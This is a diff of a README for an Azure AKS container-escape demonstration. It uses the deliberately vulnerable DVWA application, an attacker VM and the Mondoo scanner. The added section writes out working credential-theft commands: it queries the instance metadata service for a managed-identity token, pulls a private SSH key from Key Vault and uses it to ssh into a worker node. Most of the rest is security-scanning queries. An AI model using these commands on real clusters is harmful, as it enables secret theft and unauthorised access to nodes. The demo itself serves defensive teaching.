@@ -4,23 +4,44 @@ DVWA is the "Damn Vulnerable Web Application" that will be used to demonstrate h
 
 This folder contains Terraform automation code to provision the following:
 
-- **AZure AKS Cluster** - 2 worker managed nodes (standard_d2_v2)
+- **Azure AKS Cluster** - 2 worker managed nodes (standard_d2_v2)
 - **Ubuntu 18.04 Linux Instance** - This instance is provisioned for the demonstration of the container-escape demo.
 
 <!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->
 
 <!-- code_chunk_output -->
 
-- [AKS container escape demo](#AKS container escape demo)
-    - [Prerequsites](#prerequsites)
+- [AKS container escape demo](#aks-container-escape-demo)
+  - [Prerequsites](#prerequsites)
   - [Provision the cluster](#provision-the-cluster)
   - [Connect to the cluster](#connect-to-the-cluster)
+  - [Deploy Mondoo Operator to AKS](#deploy-mondoo-operator-to-aks)
+    - [Deploy cert-manager](#deploy-cert-manager)
+    - [Deploy Mondoo Operator](#deploy-mondoo-operator)
   - [Deploy and configure DVWA](#deploy-and-configure-dvwa)
+    - [Configure Port Forwarding](#configure-port-forwarding)
+    - [Login to DVWA](#login-to-dvwa)
+  - [Setup Attacker Linux Instance](#setup-attacker-linux-instance)
+    - [Start the container listener](#start-the-container-listener)
+    - [Start the host listener](#start-the-host-listener)
+    - [Start Ruby webserver](#start-ruby-webserver)
+  - [Escape time](#escape-time)
+    - [Escalate Privileges on the container](#escalate-privileges-on-the-container)
+    - [Gain access to worker nodes](#gain-access-to-worker-nodes)
+  - [Mondoo scan commands](#mondoo-scan-commands)
+    - [Scan kubernetes manifest](#scan-kubernetes-manifest)
+    - [Scan container image from registry](#scan-container-image-from-registry)
+    - [Scan kubernetes aks cluster](#scan-kubernetes-aks-cluster)
+    - [Shell to kubernetes aks cluster](#shell-to-kubernetes-aks-cluster)
+    - [Scan a azure subscription](#scan-a-azure-subscription)
+    - [Shell to azure subscription](#shell-to-azure-subscription)
   - [Destroy the cluster](#destroy-the-cluster)
+  - [License and Author](#license-and-author)
+  - [Disclaimer](#disclaimer)
 
 <!-- /code_chunk_output -->
 
-### Prerequsites
+## Prerequsites
 
 - [Azure Account](https://azure.microsoft.com/en-us/free/)
 - [AZ CLI](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)
@@ -30,13 +51,15 @@ This folder contains Terraform automation code to provision the following:
 ## Provision the cluster
 
 1. Clone the project
+
 ```bash title="Clone the project"
 git clone git@github.com:Lunalectric/container-escape.git
 ```
 
 2. cd into the terraform folder
+
 ```
-cd azure
+cd container-escape/azure
 ```
 
 3. Initialize the project (download modules)
@@ -126,12 +149,34 @@ aks-default-41472297-vmss000000   Ready    agent   24m   v1.22.11
 aks-default-41472297-vmss000001   Ready    agent   24m   v1.22.11
 ```
 
+## Deploy Mondoo Operator to AKS
+
+Deploy the Mondoo Operator to the AKS cluster according the manual [https://mondoo.com/docs/tutorials/kubernetes/scan-kubernetes-with-operator/](https://mondoo.com/docs/tutorials/kubernetes/scan-kubernetes-with-operator/)
+
+### Deploy cert-manager
+
+At first deploy the cert-manager from [https://cert-manager.io/docs/installation/](https://cert-manager.io/docs/installation/):
+
+```bash
+kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.9.1/cert-manager.yaml
+```
+
+### Deploy Mondoo Operator
+
+Create a Kubernetes Integration in the Mondoo Dashboard [https://console.mondoo.com/](https://console.mondoo.com/).
+
+![](../assets/mondoo-dashboard-k8s-integration-aks.png)
+
+Copy and paste the install commands from the Mondoo Dashboard to deploy the Mondoo Operator
+
+![](../assets/mondoo-dashboard-k8s-install-commands-aks.png)
+
 ## Deploy and configure DVWA
 
 Deploy the DVWA application to your AKS cluster.
 
 ```bash
-kubectl apply -f dvwa-deployment.yml
+kubectl apply -f ../assets/dvwa-deployment.yml
 deployment.apps/dvwa-container-escape created
 ```
 
@@ -144,7 +189,7 @@ dvwa-container-escape   1/1     1            1           47s
 ```
 
 ```bash
-kubectl describe pods                                                     32m aks-terraform[258fe00]
+kubectl describe pods
 Name:         dvwa-container-escape-5576f8b947-cv7tv
 Namespace:    default
 Priority:     0
@@ -232,7 +277,7 @@ terraform output -raw tls_private_key > id_rsa
 Connect the to the Attacker instance via ssh command:
 
 ```bash
-ssh -o StrictHostKeyChecking=no -i id_rsa azureuser@13.92.179.31        1h11m aks-terraform[258fe00]
+ssh -o StrictHostKeyChecking=no -i id_rsa azureuser@13.92.179.31
 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1089-azure x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -419,6 +464,151 @@ kubectl get nodes
 NAME                              STATUS   ROLES   AGE   VERSION
 aks-default-41472297-vmss000000   Ready    agent   24m   v1.22.11
 aks-default-41472297-vmss000001   Ready    agent   24m   v1.22.11
+```
+
+### Get keys from keyvault
+
+Get the instance metadata
+
+```bash
+curl -s -H Metadata:true --noproxy "*" 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
+```
+
+Extract the keyvault name
+
+```text
+{ "name": "keyvault", "value": "keyvaultLunalectric-akic" }
+```
+
+Get the token and query for the key:value
+
+```text
+TOKEN=$(curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net" -H "Metadata: true" | jq -r ".access_token" ) && curl -vk -s -H Metadata:true --noproxy "*" 'https://keyvaultLunalectric-akic.vault.azure.net/secrets/private-ssh-key?api-version=2016-10-01' -H "Authorization: Bearer $TOKEN"
+```
+
+Extract the ssh private key and save it in `key-ssh`
+
+```
+----BEGIN RSA PRIVATE KEY-----\nMIIJKgIBAA
+....
+```
+
+Fix the format of the ssh private key and the permissions
+
+```bash
+cat key-ssh |sed 's/\\n/\n/g' > new-ssh-key
+
+chmod 600 new-ssh-key
+```
+
+Get the public IP of the AKS node
+
+```bash
+curl -4 icanhazip.com
+```
+
+Connect via ssh to the AKS node
+
+```bash
+ssh -o StrictHostKeyChecking=no -i new-ssh-key ubuntu@40.88.137.64
+```
+
+## Mondoo scan commands
+
+### Scan kubernetes manifest
+
+```bash
+mondoo scan k8s --path ../assets/dvwa-deployment.yml
+```
+
+### Scan container image from registry
+
+```bash
+mondoo scan cr docker.io/pmuench/dvwa-container-escape:latest
+```
+
+### Scan kubernetes aks cluster
+
+```bash
+mondoo scan k8s
+```
+
+### Shell to kubernetes aks cluster
+
+```bash
+mondoo shell -t k8s
+```
+
+List all of the pods and all of their settings:
+
+```bash
+k8s.pods { * }
+```
+
+Search for the dvwa pod and show `privileged: true`
+
+```bash
+k8s.pods.where( labels['app'] == /dvwa/ ) { * }
+```
+
+Use MQL to search for configuration across your cluster such as "are containers being pulled using `tags` or their image `digest`:
+
+```bash
+k8s.pods { _.containers { image containerImage { identifierType == "digest" } } }
+```
+
+You can also just turn that into an assertion where you expect that all containers use `digest` for `identifierType`:
+
+```bash
+k8s.pods.all( _.containers { image containerImage { identifierType == "digest" } })
+```
+
+You can also use a `where` clause and just turn that into a list and filter the results:
+
+```bash
+k8s.pods.where( _.containers { image containerImage { identifierType != "digest" } })
+```
+
+You can quick check the securityContext of your clusters to see if `allowPrivilegeEscalation` is set to `true`:
+
+```bash
+k8s.pods { containers { name securityContext } }
+```
+
+Turn it into an assertion:
+
+```bash
+k8s.pods.none(containers { securityContext['allowPrivilegeEscalation'] == true })
+```
+
+Get the list of pods that fail:
+
+```bash
+k8s.pods.where(containers { securityContext['allowPrivilegeEscalation'] != true })
+```
+
+### Scan a azure subscription
+
+```bash
+mondoo scan azure --subscription {subscriptionID}
+```
+
+### Shell to azure subscription
+
+```bash
+mondoo shell -t az --option subscriptionID={subscriptionID}
+```
+
+List Azure VMs
+
+```bash
+azurerm.compute.vms { * }
+```
+
+Get access policies of all vaults
+
+```bash
+azurerm.keyvault.vaults { vaultName properties }
 ```
 
 ## Destroy the cluster
